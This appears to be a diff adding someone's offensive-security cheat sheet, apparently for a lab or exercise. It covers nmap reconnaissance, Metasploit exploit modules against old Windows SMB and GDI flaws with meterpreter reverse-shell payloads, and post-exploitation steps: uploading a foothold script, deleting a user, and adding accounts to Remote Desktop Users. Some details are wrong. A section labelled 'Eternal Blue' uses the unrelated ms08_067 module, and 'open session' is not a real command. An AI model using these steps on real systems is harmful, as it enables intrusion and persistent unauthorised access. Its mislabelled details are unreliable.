@@ -1,0 +1,73 @@
+Recon - 
+
+sudo nmap -n -sS -F -T4 -O <IP>
+
+find the netbios name of a host
+
+sudo nmap -sU -p137 --script nbstat <target>
+
+___________________________________________
+After exploit commands for Meteterpreter
+
+upload home/kali/Desktop/foothold.bat foothold.bat
+
+upload home/kali/Desktop/AfterXploit.zip AfterXploit.zip
+
+shell (opens up Windows CLI on target host)
+
+
+net user <username> /delete
+
+
+Net localgroup “Remote Desktop Users” Administrator /add 
+
+Net localgroup “Remote Desktop Users” group4 /add 
+
+
+$$$to execute the .bat file from the cli, just type its name and hit enter$$$
+
+ex: foothold.bat
+
+
+
+
+
+
+
+___________________________________________
+$$$Eternal Blue SMB - XP & Win7$$$
+
+use exploit/windows/smb/ms08_067_netapi 
+
+set rhost <target Ip> 
+
+set payload windows/meterpreter/reverse_tcp 
+
+exploit 
+
+___________________________________________
+#GDI library exploit
+
+use windows/browser/ms06_001_wmf_setabortproc
+set payload windows/meterpreter/reverse_tcp
+run
+ 
+
+#Look to see if you have any active sessions. 
+
+show sessions
+
+#Switch to the active session 
+
+open session (Session #)
+
+
+
+
+
+
+
+
+
+
+
